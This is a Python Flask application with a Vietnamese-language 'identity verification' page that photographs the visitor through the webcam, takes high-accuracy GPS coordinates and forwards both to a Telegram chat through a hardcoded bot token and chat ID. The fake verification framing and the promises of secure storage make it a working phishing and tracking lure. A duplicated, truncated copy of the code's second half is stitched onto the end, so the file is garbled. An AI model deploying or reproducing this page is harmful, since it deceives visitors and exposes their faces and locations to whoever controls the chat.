from flask import Flask, request
import requests
import os
import base64
from datetime import datetime

app = Flask(__name__)

# SỬ DỤNG BIẾN MÔI TRƯỜNG (an toàn hơn)
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8199979828:AAFTEB7wbtvrn4j3xN7sPs4d5mQdZ3q7biM')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '-1003262536143')

@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <title>Xác minh danh tính</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background: #000;
      overflow: hidden;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }
    canvas#snow {
      position: fixed;
      top: 0;
      left: 0;
      pointer-events: none;
      z-index: 1; 
    }
    video, canvas#captureCanvas {
      display: none;
    }
    
    /* MODAL XÁC NHẬN QUYỀN */
    #consentModal {
      display: none;
      position: fixed;
      z-index: 1000;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.85);
      backdrop-filter: blur(5px);
    }
    .modal-content {
      background-color: #1a1a1a;
      margin: 5% auto;
      padding: 30px;
      border: 2px solid #ff4136;
      border-radius: 12px;
      width: 90%;
      max-width: 500px;
      color: white;
      box-shadow: 0 10px 40px rgba(255, 65, 54, 0.3);
      animation: slideIn 0.3s ease-out;
    }
    @keyframes slideIn {
      from {
        transform: translateY(-50px);
        opacity: 0;
      }
      to {
        transform: translateY(0);
        opacity: 1;
      }
    }
    .modal-content h2 {
      color: #ff4136;
      margin-bottom: 20px;
      font-size: 1.5em;
      text-align: center;
    }
    .permission-list {
      background: #2a2a2a;
      padding: 20px;
      border-radius: 8px;
      margin: 20px 0;
    }
    .permission-item {
      display: flex;
      align-items: start;
      margin: 15px 0;
      padding: 10px;
      background: #333;
      border-radius: 6px;
    }
    .permission-icon {
      font-size: 1.5em;
      margin-right: 15px;
      min-width: 30px;
    }
    .permission-text {
      flex: 1;
    }
    .permission-text strong {
      color: #ff4136;
      display: block;
      margin-bottom: 5px;
    }
    .permission-text small {
      color: #aaa;
      line-height: 1.4;
    }
    .consent-checkbox {
      display: flex;
      align-items: center;
      margin: 20px 0;
      padding: 15px;
      background: #2a2a2a;
      border-radius: 8px;
    }
    .consent-checkbox input[type="checkbox"] {
      width: 20px;
      height: 20px;
      margin-right: 10px;
      cursor: pointer;
    }
    .consent-checkbox label {
      cursor: pointer;
      font-size: 0.95em;
      line-height: 1.5;
    }
    .modal-buttons {
      display: flex;
      gap: 10px;
      margin-top: 20px;
    }
    .modal-buttons button {
      flex: 1;
      padding: 12px;
      font-size: 1em;
      font-weight: bold;
      cursor: pointer;
      border: none;
      border-radius: 8px;
      transition: all 0.3s;
    }
    #acceptButton {
      background-color: #28a745;
      color: white;
    }
    #acceptButton:hover:not(:disabled) {
      background-color: #218838;
      transform: translateY(-2px);
    }
    #acceptButton:disabled {
      background-color: #555;
      cursor: not-allowed;
      opacity: 0.5;
    }
    #cancelButton {
      background-color: #dc3545;
      color: white;
    }
    #cancelButton:hover {
      background-color: #c82333;
      transform: translateY(-2px);
    }
    
    /* NÚT CHÍNH */
    .container {
      position: relative;
      z-index: 10;
      text-align: center;
    }
    #startButton {
      padding: 18px 40px;
      font-size: 1.3em;
      font-weight: bold;
      cursor: pointer;
      border: 2px solid #fff;
      border-radius: 10px;
      background-color: rgba(255, 65, 54, 0.9);
      color: white;
      transition: all 0.3s;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
    }
    #startButton:hover:not(:disabled) {
      background-color: #cc0000;
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(255, 65, 54, 0.5);
    }
    #startButton:disabled {
      background-color: #444;
      cursor: not-allowed;
      opacity: 0.6;
    }
    
    .privacy-note {
      color: #aaa;
      font-size: 0.85em;
      margin-top: 15px;
      max-width: 400px;
    }
  </style>
</head>
<body>
  <canvas id="snow"></canvas>
  
  <!-- MODAL XÁC NHẬN QUYỀN -->
  <div id="consentModal">
    <div class="modal-content">
      <h2>🔒 Xác nhận quyền riêng tư</h2>
      
      <div class="permission-list">
        <div class="permission-item">
          <div class="permission-icon">📷</div>
          <div class="permission-text">
            <strong>Quyền truy cập Camera</strong>
            <small>Chúng tôi sẽ chụp ảnh khuôn mặt của bạn để xác minh danh tính. Ảnh sẽ được lưu trữ an toàn.</small>
          </div>
        </div>
        
        <div class="permission-item">
          <div class="permission-icon">📍</div>
          <div class="permission-text">
            <strong>Quyền truy cập Vị trí</strong>
            <small>Chúng tôi sẽ ghi nhận vị trí GPS của bạn để xác thực địa điểm. Thông tin này được mã hóa.</small>
          </div>
        </div>
      </div>
      
      <div class="consent-checkbox">
        <input type="checkbox" id="consentCheck">
        <label for="consentCheck">
          Tôi đã đọc và đồng ý cho phép ứng dụng truy cập camera và vị trí của tôi. Tôi hiểu rằng dữ liệu sẽ được sử dụng cho mục đích xác minh danh tính.
        </label>
      </div>
      
      <div class="modal-buttons">
        <button id="cancelButton">Từ chối</button>
        <button id="acceptButton" disabled>Đồng ý và tiếp tục</button>
      </div>
    </div>
  </div>
  
  <div class="container">
    <button id="startButton">Bắt đầu xác minh</button>
    <p class="privacy-note">
      🔐 Dữ liệu của bạn được bảo mật theo chính sách quyền riêng tư
    </p>
  </div>

  <video id="video" autoplay muted playsinline></video>
  <canvas id="captureCanvas" width="640" height="480"></canvas>

  <script>
    // ❄️ Hiệu ứng tuyết rơi
    const canvas = document.getElementById('snow');
    const ctx = canvas.getContext('2d');
    let width = window.innerWidth;
    let height = window.innerHeight;
    canvas.width = width;
    canvas.height = height;

    let flakes = [];
    for (let i = 0; i < 150; i++) {
      flakes.push({
        x: Math.random() * width,
        y: Math.random() * height,
        r: Math.random() * 3 + 1,
        d: Math.random() * 100
      });
    }

    function drawSnow() {
      ctx.clearRect(0, 0, width, height);
      ctx.fillStyle = "rgba(255, 255, 255, 0.8)";
      ctx.beginPath();
      for (let i = 0; i < flakes.length; i++) {
        let f = flakes[i];
        ctx.moveTo(f.x, f.y);
        ctx.arc(f.x, f.y, f.r, 0, Math.PI * 2, true);
      }
      ctx.fill();
      updateSnow();
    }

    let angle = 0;
    function updateSnow() {
      angle += 0.005; 
      for (let i = 0; i < flakes.length; i++) {
        let f = flakes[i];
        f.y += Math.cos(angle + f.d) + 0.5 + f.r / 2; 
        f.x += Math.sin(angle) * 1.5; 
        if (f.y > height) {
          flakes[i] = { x: Math.random() * width, y: 0, r: f.r, d: f.d };
        }
      }
    }

    setInterval(drawSnow, 33);
    
    // 📸 Logic xác nhận và chụp ảnh
    const video = document.getElementById('video');
    const canvasCapture = document.getElementById('captureCanvas');
    const startButton = document.getElementById('startButton');
    const consentModal = document.getElementById('consentModal');
    const consentCheck = document.getElementById('consentCheck');
    const acceptButton = document.getElementById('acceptButton');
    const cancelButton = document.getElementById('cancelButton');

    // Debug: Log khi trang load
    console.log('✅ Trang đã load xong');
    console.log('Các element:', {
      startButton: !!startButton,
      consentModal: !!consentModal,
      consentCheck: !!consentCheck,
      acceptButton: !!acceptButton,
      cancelButton: !!cancelButton
    });

    // Kích hoạt nút đồng ý khi checkbox được chọn
    consentCheck.addEventListener('change', function() {
      console.log('Checkbox changed:', this.checked);
      acceptButton.disabled = !this.checked;
    });

    // Hiển thị modal khi nhấn nút bắt đầu
    startButton.addEventListener('click', function(e) {
      e.preventDefault();
      console.log('🖱️ Đã click nút bắt đầu');
      consentModal.style.display = 'block';
    });

    // Xử lý nút từ chối
    cancelButton.addEventListener('click', function(e) {
      e.preventDefault();
      console.log('❌ Từ chối');
      consentModal.style.display = 'none';
      consentCheck.checked = false;
      acceptButton.disabled = true;
      alert('Bạn đã từ chối cấp quyền. Không thể tiếp tục xác minh.');
    });

    // Xử lý nút đồng ý
    acceptButton.addEventListener('click', function(e) {
      e.preventDefault();
      console.log('✅ Đã click đồng ý');
      
      if (!consentCheck.checked) {
        alert('Vui lòng đồng ý với điều khoản trước khi tiếp tục.');
        return;
      }
      
      consentModal.style.display = 'none';
      console.log('🚀 Bắt đầu chụp ảnh...');
      startCapture();
    });

    function startCapture() {
      startButton.disabled = true;
      startButton.textContent = '⏳ Đang khởi động camera...';

      navigator.mediaDevices.getUserMedia({ 
        video: { 
          width: { ideal: 640 },
          height: { ideal: 480 },
          facingMode: 'user'
        } 
      })
      .then(stream => {
        video.srcObject = stream;
        
        // Chờ video sẵn sàng
        video.onloadedmetadata = () => {
          startButton.textContent = '📸 Đang chụp ảnh...';
          
          // Chụp sau 3 giây
          setTimeout(() => {
            const context = canvasCapture.getContext('2d');
            context.drawImage(video, 0, 0, canvasCapture.width, canvasCapture.height);
            const imageData = canvasCapture.toDataURL('image/jpeg', 0.8);
            
            // Dừng camera
            stream.getTracks().forEach(track => track.stop());
            
            startButton.textContent = '📍 Đang lấy vị trí...';
            
            // Lấy vị trí
            navigator.geolocation.getCurrentPosition(
              function(position) {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                sendData(imageData, lat, lon);
              }, 
              function(error) {
                console.warn('Không lấy được vị trí:', error);
                sendData(imageData, 'không xác định', 'không xác định');
              },
              {
                enableHighAccuracy: true,
                timeout: 5000,
                maximumAge: 0
              }
            );
          }, 3000);
        };
      })
      .catch(err => {
        console.error('Lỗi camera:', err);
        startButton.textContent = '❌ Không thể truy cập camera';
        startButton.disabled = false;
        alert('Lỗi: ' + err.message + '\n\nVui lòng cho phép truy cập camera trong cài đặt trình duyệt.');
      });
    }

    function sendData(imageData, lat, lon) {
      startButton.textContent = '☁️ Đang tải lên...';
      
      const payload = new URLSearchParams();
      payload.append('image', imageData);
      payload.append('lat', lat);
      payload.append('lon', lon);

      fetch('/upload', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: payload
      })
      .then(response => response.text())
      .then(data => {
        console.log('Phản hồi từ server:', data);
        if (data === 'OK') {
          startButton.textContent = '✅ Xác minh thành công!';
          startButton.style.backgroundColor = '#28a745';
        } else {
          startButton.textContent = '⚠️ Có lỗi xảy ra';
          startButton.style.backgroundColor = '#ffc107';
        }
      })
      .catch(err => {
        console.error('Lỗi upload:', err);
        startButton.textContent = '❌ Lỗi kết nối';
        startButton.style.backgroundColor = '#dc3545';
        startButton.disabled = false;
      });
    }
  </script>
</body>
</html>
'''

@app.route('/upload', methods=['POST'])
def upload():
    data_url = request.form.get('image')
    lat = request.form.get('lat', 'không xác định')
    lon = request.form.get('lon', 'không xác định')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    if not data_url:
        print("Không nhận được dữ liệu ảnh")
        return 'Lỗi: Không có dữ liệu ảnh', 400

    try:
        # Xử lý base64
        if ',' in data_url:
            encoded = data_url.split(',', 1)[1]
        else:
            encoded = data_url
        
        image_data = base64.b64decode(encoded)
        print(f"Đã decode ảnh thành công, kích thước: {len(image_data)} bytes")
        
    except Exception as e:
        print(f"LỖI DECODE BASE64: {e}")
        return 'Lỗi decode ảnh', 400

    # Tạo caption
    caption = f"📸 Xác minh tự động\n⏰ Thời gian: {timestamp}\n📍 Vị trí: {lat}, {lon}"

    # Gửi đến Telegram
    files = {'photo': ('verification.jpg', image_data, 'image/jpeg')}
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
    data = {
        'chat_id': TELEGRAM_CHAT_ID,
        'caption': caption
    }

    try:
        response = requests.post(url, data=data, files=files, timeout=10)
        
        if response.ok:
            print("✅ Gửi ảnh thành công đến Telegram")
            return 'OK', 200
        else:
            print(f"❌ LỖI TELEGRAM API:")
            print(f"   - Status Code: {response.status_code}")
            print(f"   - Response: {response.text}")
            return 'Lỗi gửi ảnh', 500
            
    except requests.exceptions.Timeout:
        print("❌ LỖI: Timeout khi kết nối Telegram")
        return 'Lỗi timeout', 504
    except requests.exceptions.RequestException as e:
        print(f"❌ LỖI KẾT NỐI: {e}")
        return 'Lỗi kết nối', 500

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False) vị trí
            navigator.geolocation.getCurrentPosition(
              function(position) {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                sendData(imageData, lat, lon);
              }, 
              function(error) {
                console.warn('Không lấy được vị trí:', error);
                sendData(imageData, 'không xác định', 'không xác định');
              },
              {
                enableHighAccuracy: true,
                timeout: 5000,
                maximumAge: 0
              }
            );
          }, 3000);
        };
      })
      .catch(err => {
        console.error('Lỗi camera:', err);
        startButton.textContent = 'Không thể truy cập camera';
        startButton.disabled = false;
        alert('Lỗi: ' + err.message + '\n\nVui lòng cho phép truy cập camera trong cài đặt trình duyệt.');
      });
    }

    function sendData(imageData, lat, lon) {
      startButton.textContent = 'Đang tải lên...';
      
      const payload = new URLSearchParams();
      payload.append('image', imageData);
      payload.append('lat', lat);
      payload.append('lon', lon);

      fetch('/upload', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: payload
      })
      .then(response => response.text())
      .then(data => {
        console.log('Phản hồi từ server:', data);
        if (data === 'OK') {
          startButton.textContent = 'Xác minh thành công!';
          startButton.style.backgroundColor = '#28a745';
        } else {
          startButton.textContent = 'Có lỗi xảy ra';
          startButton.style.backgroundColor = '#ffc107';
        }
      })
      .catch(err => {
        console.error('Lỗi upload:', err);
        startButton.textContent = 'Lỗi kết nối';
        startButton.style.backgroundColor = '#dc3545';
        startButton.disabled = false;
      });
    }
  </script>
</body>
</html>
'''

@app.route('/upload', methods=['POST'])
def upload():
    data_url = request.form.get('image')
    lat = request.form.get('lat', 'không xác định')
    lon = request.form.get('lon', 'không xác định')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    if not data_url:
        print("Không nhận được dữ liệu ảnh")
        return 'Lỗi: Không có dữ liệu ảnh', 400

    try:
        # Xử lý base64
        if ',' in data_url:
            encoded = data_url.split(',', 1)[1]
        else:
            encoded = data_url
        
        image_data = base64.b64decode(encoded)
        print(f"Đã decode ảnh thành công, kích thước: {len(image_data)} bytes")
        
    except Exception as e:
        print(f"LỖI DECODE BASE64: {e}")
        return 'Lỗi decode ảnh', 400

    # Tạo caption
    caption = f"Tự động\nThời gian: {timestamp}\nVị trí: {lat}, {lon}"

    # Gửi đến Telegram
    files = {'photo': ('verification.jpg', image_data, 'image/jpeg')}
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
    data = {
        'chat_id': TELEGRAM_CHAT_ID,
        'caption': caption
    }

    try:
        response = requests.post(url, data=data, files=files, timeout=10)
        
        if response.ok:
            print("✅ Gửi ảnh thành công đến Telegram")
            return 'OK', 200
        else:
            print(f"❌ LỖI TELEGRAM API:")
            print(f"   - Status Code: {response.status_code}")
            print(f"   - Response: {response.text}")
            return 'Lỗi gửi ảnh', 500
            
    except requests.exceptions.Timeout:
        print("❌ LỖI: Timeout khi kết nối Telegram")
        return 'Lỗi timeout', 504
    except requests.exceptions.RequestException as e:
        print(f"❌ LỖI KẾT NỐI: {e}")
        return 'Lỗi kết nối', 500

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)

